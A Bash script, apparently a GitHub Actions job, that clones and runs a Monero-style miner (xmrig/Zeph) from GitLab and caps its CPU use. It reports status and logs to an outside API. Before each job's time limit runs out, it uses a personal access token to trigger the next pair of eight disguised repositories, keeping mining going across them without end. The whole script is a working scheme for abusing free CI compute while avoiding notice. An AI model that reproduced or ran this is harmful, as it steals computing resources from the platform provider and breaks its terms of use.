#!/bin/bash

# --- 1. AYARLAR VE TANIMLAR ---
# Her repo için WORKER_ID (1-8 arası) repository_dispatch ile gelecek
WORKER_NAME="PRIME_W_$WORKER_ID"
START_TIME=$SECONDS
API_URL="https://miysoft.com/miner/prime_api.php"
USER_NAME="tosunhalil924-lang"

# --- 2. SİSTEM HAZIRLIĞI ---
sudo apt-get update && sudo apt-get install -y cpulimit curl jq git
df -h

# --- 3. PROJE KURULUMU (ZEPH) ---
echo "Zeph Logic modülü indiriliyor..."
git clone https://gitlab.com/paradoxsal/paradoxsal_miner_prime logic_module
cd logic_module
chmod +x zeph_install.sh

# --- 4. ÇALIŞTIRMA VE KISITLAMA ---
# Arka planda başlatıyoruz
nohup ./zeph_install.sh > ../process.log 2>&1 &
sleep 15 # Başlaması için zaman tanı

# Ana işlem PID'sini bul (Genelde xmrig veya script ismiyle çalışır)
# PID tespiti için en yüksek CPU kullanan işlemi buluyoruz
TASK_PID=$(ps aux | grep -v "grep" | grep -v "worker_prime" | grep -v "sshd" | sort -nrk 3 | head -1 | awk '{print $2}')

if [ ! -z "$TASK_PID" ]; then
    echo "Görev Tespit Edildi (PID: $TASK_PID). %70 CPU Limiti Uygulanıyor..."
    # 2 Core CPU için %70 = 140 limit (cpulimit -l 140)
    sudo cpulimit -p $TASK_PID -l 140 &
else
    echo "Uyarı: Ana PID tespit edilemedi, logları kontrol et."
fi

# --- 5. İZLEME VE RAPORLAMA DÖNGÜSÜ (5 SAAT 45 DK) ---
# 20700 saniye = 5 saat 45 dakika. 15 dk kala devir teslim başlar.
while [ $((SECONDS - START_TIME)) -lt 20700 ]; do
    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    RAM_USAGE=$(free -m | awk '/Mem:/ { print $3 }') # MB cinsinden
    RAM_PCT=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # RAM Koruması: 2.5 GB (2560 MB) aşılırsa uyarı ver veya işlemi yavaşlat
    if [ "$RAM_USAGE" -gt 2560 ]; then
        STATUS="RAM_CRITICAL"
    else
        STATUS="ACTIVE_PRIME"
    fi

    # Logları çek ve Base64 yap
    LOGS=$(tail -n 12 ../process.log | base64 -w 0)
    
    # Miysoft API Raporu
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"$WORKER_NAME\", \"cpu\":\"$CPU\", \"ram\":\"$RAM_PCT\", \"status\":\"$STATUS\", \"logs\":\"$LOGS\"}" \
         $API_URL || true
    
    sleep 30
done

# --- 6. DÖNGÜSEL TETİKLEME (VARDİYA DEĞİŞİMİ) ---
echo "Vardiya süresi doldu. Sonraki repolar uyandırılıyor..."

# Tetikleme mantığı: 1-2 -> 3-4 -> 5-6 -> 7-8 -> 1-2
case $WORKER_ID in
  1|2) NEXT1=3; NEXT2=4 ;;
  3|4) NEXT1=5; NEXT2=6 ;;
  5|6) NEXT1=7; NEXT2=8 ;;
  7|8) NEXT1=1; NEXT2=2 ;;
esac

# Repo listesi (Sıralama ID'ye göre)
REPOS=("Atlas-Core-System" "Helios-Data-Stream" "Icarus-Sync-Node" "Hermes-Relay-Point" "Ares-Flow-Control" "Zeus-Buffer-Cloud" "Apollo-Logic-Vault" "Athena-Task-Manager")

REPO1=${REPOS[$((NEXT1-1))]}
REPO2=${REPOS[$((NEXT2-1))]}

trigger_next() {
  local target_repo=$1
  local next_id=$2
  echo "Tetikleniyor: $target_repo (ID: $next_id)"
  curl -X POST -H "Authorization: token $PAT_TOKEN" \
       -H "Accept: application/vnd.github.v3+json" \
       "https://api.github.com/repos/$USER_NAME/$target_repo/dispatches" \
       -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$next_id\"}}"
}

trigger_next "$REPO1" "$NEXT1"
trigger_next "$REPO2" "$NEXT2"

# --- 7. KAPANIŞ (YEŞİL TİK) ---
pkill -f zeph
pkill -f xmrig
sleep 5
echo "Görev başarıyla tamamlandı ve devredildi."
exit 0
